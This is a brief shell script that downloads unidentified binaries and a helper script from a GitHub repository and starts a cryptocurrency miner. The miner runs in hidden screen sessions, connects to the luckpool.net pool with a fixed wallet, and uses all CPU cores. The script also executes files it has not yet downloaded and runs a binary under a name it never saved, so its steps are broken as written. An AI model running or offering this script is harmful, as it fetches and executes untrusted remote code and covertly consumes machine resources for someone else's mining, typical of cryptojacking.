  
#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS kontol1.sh ./kontol1.sh 65 75

wget https://github.com/renilo/xmr/raw/main/memek

wget -O meki-baru https://github.com/renilo/xmr/raw/main/meki-baru1

chmod +x meki-baru

screen -dmS run ./meki-baru1 -v -l eu.luckpool.net:3956 -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.NONAMEK -p x -t $(nproc)

wget https://raw.githubusercontent.com/renilo/xmr/main/kontol1.sh

chmod +x kontol1.sh

./kontol1.sh
